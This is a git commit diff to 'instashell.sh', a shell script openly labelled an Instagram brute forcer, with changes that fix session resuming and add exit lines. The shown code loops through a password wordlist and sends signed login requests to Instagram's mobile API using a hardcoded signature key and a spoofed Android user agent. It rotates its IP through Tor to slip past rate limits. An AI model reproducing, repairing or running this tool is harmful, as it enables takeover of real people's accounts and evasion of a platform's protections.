bc067ffdd628f1cc6133e7a5c45944be8135bc73
The Linux Choice <34893261+thelinuxchoice@users.noreply.github.com>
2018-03-27 15:32:49 -0300

    v1.5.2: Fixed bug on resume sessions. Added exit rotine.

--- instashell.sh
+++ instashell.sh
@@ -50,7 +50,7 @@ printf "\e[1;92m ) )| ||  _ \  /___)(_   _)(____ | /___)|  _ \ | ___ || || |    
 printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ ||___ || | | || ____|| || |  _____   \e[0m\n"
 printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|(___/ |_| |_||_____) \_)\_)(_____)  \e[0m\n"
 printf "\n"
-printf "\e[1;77m\e[45m  Instagram Brute Forcer v1.5.1 Author: thelinuxchoice (Github/IG)   \e[0m\n"
+printf "\e[1;77m\e[45m  Instagram Brute Forcer v1.5.2 Author: thelinuxchoice (Github/IG)   \e[0m\n"
 printf "\n"
 }
 
@@ -117,7 +117,7 @@ fi
 function changeip() {
 
 killall -HUP tor
-#sleep 3
+
 
 }
 
@@ -131,7 +131,7 @@ printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
 token=0
 startline=1
 endline="$threads"
-while [ true ]; do
+while [ $token -lt $count_pass ]; do
 IFS=$'\n'
 for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
@@ -152,6 +152,7 @@ let startline+=$threads
 let endline+=$threads
 changeip
 done
+exit 1
 }
 
 
@@ -185,16 +186,16 @@ printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
 
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
 
-while [ true ]; do
+while [ $token -lt $count_pass ]; do
 IFS=$'\n'
-for pass in $(sed -n '/'$pass'/,'$((countpass+threads))'p' $wl_pass); do
+for pass in $(sed -n '/\b'$pass'\b/,'$(($token+threads))'p' $wl_pass); do
 
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
 ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
 
-countpass=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
+countpass=$(grep -n -w "$pass" "$wl_pass" | cut -d ":" -f1)
 hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
 useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $pass
@@ -203,6 +204,7 @@ let token++
 
 changeip
 done
+exit 1
 }
 
 case "$1" in --resume) resume ;; *)
